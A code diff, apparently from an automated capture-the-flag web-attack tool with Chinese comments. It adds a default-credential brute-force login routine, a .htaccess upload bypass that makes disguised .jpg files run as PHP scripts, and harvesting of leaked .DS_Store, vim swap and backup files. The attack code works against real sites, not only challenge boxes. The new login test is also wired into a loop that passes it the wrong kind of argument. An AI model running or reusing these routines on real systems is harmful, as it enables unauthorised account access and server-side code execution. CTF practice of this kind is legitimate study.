@@ -648,6 +648,56 @@ def test_cmdi(ctx, target):
                 confidence="low")
 
 
+WEAK_CREDS = [("admin", "admin"), ("admin", "123456"), ("admin", "admin888"),
+              ("admin", "password"), ("root", "root"), ("root", "123456"),
+              ("test", "test"), ("guest", "guest")]
+
+
+def test_login(ctx, fp):
+    """弱口令：只在页面确实有账号/密码表单时试小字典，最多 8 次请求。"""
+    jobs = [f for f in (fp.get("forms") or []) if len(f.get("fields") or {}) >= 2]
+    if not jobs:
+        return []
+    hits = []
+    for form in jobs[:1]:
+        names = list(form["fields"].keys())
+        user_key = next((k for k in names
+                         if re.search(r"(?i)user|name|account|login|email", k)), names[0])
+        pass_key = next((k for k in names
+                         if re.search(r"(?i)pass|pwd|secret", k)), names[-1])
+        base_item = ctx.get(form["action"])
+        base_len = len(text_of(base_item))
+        for user, pwd in WEAK_CREDS:
+            fields = dict(form["fields"])
+            fields[user_key] = user
+            fields[pass_key] = pwd
+            item = ctx.post_form(form["action"], fields, referer=ctx.url)
+            body = text_of(item)
+            status = item.get("status")
+            if status in (0, 500, 502, 503):
+                continue
+            ok = False
+            if status in (301, 302, 303):
+                loc = item.get("location") or ""
+                if loc and not re.search(r"(?i)login|signin|error|fail", loc):
+                    ok = True
+            if re.search(r"(?i)(登录成功|登陆成功|login success|welcome back|dashboard|控制台|管理后台)", body):
+                ok = True
+            if re.search(r"(?i)(用户名或密码错误|密码错误|登录失败|invalid credentials|wrong password)", body):
+                ok = False
+            if not ok and abs(len(body) - base_len) > 200 and status == 200 and \
+                    re.search(r"(?i)(logout|退出登录|注销)", body):
+                ok = True
+            if ok:
+                ctx.add("weak-login", form["action"], confidence="medium",
+                        evidence="账号 %s / 密码 %s 登录成功（以回显/跳转为据）" % (user, pwd))
+                ctx.log("[deep] 弱口令命中：%s / %s（%s）" % (user, pwd, form["action"]))
+                hits.append({"url": form["action"], "user": user, "password": pwd})
+                collect_flags(body)
+                return hits
+    return hits
+
+
 def test_ssrf(ctx, target):
     if not re.search(r"(?i)(url|uri|link|src|dest|target|redirect|next|image|file|path|load)",
                     target["param"]):
@@ -754,7 +804,44 @@ def test_upload(ctx, fp):
                     _read_flag_via_upload(ctx, form, field, u, ctype)
             else:
                 ctx.log("[deep] 上传 %s 后 8 个候选路径均未回显标记" % token_name)
+        if not any(r.get("exec") for r in results):
+            _try_htaccess(ctx, form, field, results)
     return results
+
+
+HTACCESS_BODY = (b"AddType application/x-httpd-php .jpg\n"
+                 b"AddHandler application/x-httpd-php .jpg\n")
+
+
+def _try_htaccess(ctx, form, field, results):
+    """.htaccess 绕过：先把 .jpg 映射成 PHP，再传伪装成图片的脚本。"""
+    fields = {k: v for k, v in form["fields"].items() if k != field}
+    name1 = ".htaccess"
+    r1 = ctx.post_multipart(form["action"], fields, field, name1, HTACCESS_BODY, "text/plain",
+                            referer=ctx.url)
+    ctx.log("[deep] .htaccess 上传 → HTTP %s" % r1.get("status"))
+    if r1.get("status") != 200:
+        return
+    base = "ht" + ctx.token
+    name2 = base + ".jpg"
+    r2 = ctx.post_multipart(form["action"], fields, field, name2,
+                            b"<?php echo 'CTFBOXUPLOAD9137'; ?>", "image/jpeg",
+                            referer=ctx.url)
+    ctx.log("[deep] .htaccess 生效后上传 %s → HTTP %s" % (name2, r2.get("status")))
+    if r2.get("status") != 200:
+        return
+    for d in UPLOAD_DIRS + [""]:
+        u = ctx.root.rstrip("/") + "/" + (d + "/" if d else "") + name2
+        got = ctx.get(u, referer=form["action"])
+        body = text_of(got)
+        if UPLOAD_MARK in body:
+            ctx.add("upload-exec", u, payload=name2,
+                    evidence=".htaccess 把 .jpg 解析成 PHP，脚本已执行（回显 %s）" % UPLOAD_MARK)
+            results.append({"url": u, "filename": name2, "exec": True, "form": form["action"],
+                            "kind": ".htaccess + .jpg", "ctype": "image/jpeg"})
+            ctx.log("[deep] .htaccess 绕过成功：%s" % u)
+            _read_flag_via_upload(ctx, form, field, u, "image/jpeg")
+            return
 
 
 def _read_flag_via_upload(ctx, form, field, exec_url, ctype="application/x-php"):
@@ -846,13 +933,47 @@ def dir_crawl(ctx, max_pages=60, depth=3):
     return bool(ctx.flags)
 
 
+def ds_store_names(body):
+    """从 .DS_Store 里抠出文件名（Bud1 格式里名字是连续可打印串）。"""
+    import re
+    out = []
+    for raw in re.findall(rb"[ -~]{4,}", body):
+        name = raw.decode("latin-1", "ignore").strip()
+        if name and not name.startswith(("Bud1", "\x00")) and len(name) < 120:
+            out.append(name)
+    return out
+
+
+def vim_swap_text(body):
+    """vim swap 里保存的是原文件全文，按可打印串还原（够用来找 flag）。"""
+    import re
+    parts = [raw.decode("latin-1", "ignore") for raw in re.findall(rb"[ -~\t\r\n]{8,}", body)]
+    return "\n".join(parts)
+
+
 def backup_hunt(ctx):
     """备份/源码泄露：拉常见站点备份与 .git 索引，压缩包内直接找 flag。只读下载。"""
     import io, zipfile
     names = ["www.zip", "www.tar.gz", "www.tar", "backup.zip", "web.zip", "html.zip",
              "wwwroot.zip", "src.zip", "source.zip", "site.zip", "www.rar",
              "index.php.bak", "index.php~", "index.php.swp", ".index.php.swp",
-             "www.bak", "web.rar", "backup.rar", "db.sql", "database.sql"]
+             "www.bak", "web.rar", "backup.rar", "db.sql", "database.sql",
+             ".DS_Store", ".svn/entries", "WEB-INF/web.xml"]
+    # .DS_Store：先解析出文件名，再逐个回读，命中 flag 直接返回
+    ds = ctx.get(ctx.root.rstrip("/") + "/.DS_Store")
+    if ds.get("status") == 200 and b"Bud1" in (ds.get("body") or b""):
+        names_in_store = ds_store_names(ds.get("body") or b"")[:40]
+        ctx.add("ds-store", ds["url"], evidence="解析出 %d 个文件名" % len(names_in_store),
+                confidence="medium")
+        ctx.log("[deep] .DS_Store 可下载，解析出 %d 个名字" % len(names_in_store))
+        for nm in names_in_store:
+            if "/" in nm or " " in nm:
+                continue
+            item = ctx.get(ctx.root.rstrip("/") + "/" + nm)
+            if item.get("status") == 200 and collect_flags(text_of(item)):
+                ctx.log("[deep] .DS_Store 指向的 %s 直接给 flag" % nm)
+                return True
+
     for name in names:
         item = ctx.get(ctx.root.rstrip("/") + "/" + name)
         body = item.get("body") or b""
@@ -860,6 +981,13 @@ def backup_hunt(ctx):
             continue
         ctx.add("backup-file", item["url"], evidence="%s 可下载（%d 字节）" % (name, len(body))
                 , confidence="medium")
+        if b"b0VIM" in body[:64]:
+            text = vim_swap_text(body)
+            if collect_flags(text):
+                ctx.add("vim-swap", item["url"], evidence="vim 交换文件里还原出 flag")
+                ctx.log("[deep] vim 缓存 %s 里还原出 flag" % name)
+                return True
+            ctx.add("vim-swap", item["url"], evidence="vim 交换文件可读，未直接含 flag")
         try:
             zf = zipfile.ZipFile(io.BytesIO(body))
         except Exception:
@@ -963,7 +1091,7 @@ def campaign(url, log=print, max_requests=DEFAULT_MAX_REQUESTS, max_seconds=DEFA
         log("[deep] 待测参数 %d 个：%s"
             % (len(targets), ", ".join("%s(%s)" % (t["param"], t["kind"]) for t in targets) or "无"))
         for target in targets:
-            for fn in (test_sqli, test_xss, test_lfi, test_ssti, test_cmdi, test_ssrf):
+            for fn in (test_sqli, test_xss, test_lfi, test_ssti, test_cmdi, test_ssrf, test_login):
                 try:
                     fn(ctx, target)
                 except AutoStop:
